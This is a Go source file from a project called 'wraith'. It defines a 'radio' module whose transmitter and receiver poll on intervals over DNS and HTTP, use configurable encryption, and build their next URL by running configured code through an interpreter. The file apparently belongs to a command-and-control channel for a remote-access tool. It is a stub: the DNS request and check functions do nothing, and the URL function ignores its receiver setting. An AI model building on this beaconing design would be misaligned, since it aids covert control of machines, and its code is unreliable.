package radio

import (
	"fmt"

	"github.com/TR-SLimey/wraith/config"
	"github.com/TR-SLimey/wraith/radio/frequencies"
	"github.com/traefik/yaegi/interp"
)

func NewRadio() Radio {
	r := Radio{
		Transmitter: Antenna{
			URLGenerator: config.Config.Radio.Transmitter.DefaultURLGenerator,
			Interval:     config.Config.Radio.Transmitter.DefaultIntervalSeconds,
		},
		Receiver: Antenna{
			URLGenerator: config.Config.Radio.Receiver.DefaultURLGenerator,
			Interval:     config.Config.Radio.Receiver.DefaultIntervalSeconds,
		},
		FrequencyMap: make(map[string]Frequency),
	}

	r.Transmitter.Crypto.Enabled = config.Config.Radio.Transmitter.Encryption.Enabled
	r.Transmitter.Crypto.Type = config.Config.Radio.Transmitter.Encryption.Type
	r.Transmitter.Crypto.Key = config.Config.Radio.Transmitter.Encryption.Key

	r.Receiver.Crypto.Enabled = config.Config.Radio.Receiver.Encryption.Enabled
	r.Receiver.Crypto.Type = config.Config.Radio.Receiver.Encryption.Type
	r.Receiver.Crypto.Key = config.Config.Radio.Receiver.Encryption.Key

	r.FrequencyMap["dns"] = frequencies.DNS{}
	r.FrequencyMap["http"] = frequencies.HTTP{}
	r.FrequencyMap["https"] = r.FrequencyMap["http"]
	return r
}

type Radio struct {
	Transmitter  Antenna
	Receiver     Antenna
	FrequencyMap map[string]Frequency
}

type Antenna struct {
	URLGenerator  string
	Interval      int
	LastTimestamp int
	LastURL       string
	Crypto        struct {
		Enabled bool
		Type    int
		Key     string
	}
	Verifier struct {
		Enabled bool
		Type    int
		Key     string
	}
}

type Frequency interface {
}

func (r *Radio) GenerateRadioURL(urltype int) (string, error) {
	var module Antenna
	if urltype == 0 {
		module = r.Transmitter
	} else if urltype == 1 {
		module = r.Receiver
	} else {
		return "", fmt.Errorf("invalid urltype")
	}
	// Use yaegi to run function to generate the next check URL
	i := interp.New(interp.Options{})
	_, err := i.Eval(r.Transmitter.URLGenerator)
	if err != nil {
		return "", err
	}
	v, err := i.Eval("gen.Gen")
	if err != nil {
		return "", err
	}
	gen := v.Interface().(func(string) string)
	result := gen(module.LastURL)
	// TODO: Check if result is valid URL
	return result, nil
}

func MakeDNSRequest(dnsname, record string) string {
	return "a"
}

func (r *Radio) Check() error {
	return nil
}
